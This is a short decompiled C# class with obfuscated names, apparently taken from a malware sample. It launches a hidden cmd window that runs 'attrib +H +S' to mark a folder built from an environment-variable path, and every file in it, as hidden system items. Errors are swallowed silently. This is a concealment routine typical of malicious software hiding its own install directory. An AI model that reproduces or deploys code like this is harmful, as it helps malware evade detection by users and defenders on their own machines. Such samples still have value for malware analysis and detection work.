using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns20;

namespace ns2;

public class GClass2
{
	public static void smethod_0()
	{
		try
		{
			string text = "attrib +H +S \"" + (Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9).TrimEnd(new char[1] { '\\' });
			Interaction.Shell("cmd /c " + text + "\" & " + text + "\\*\" /S /D", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
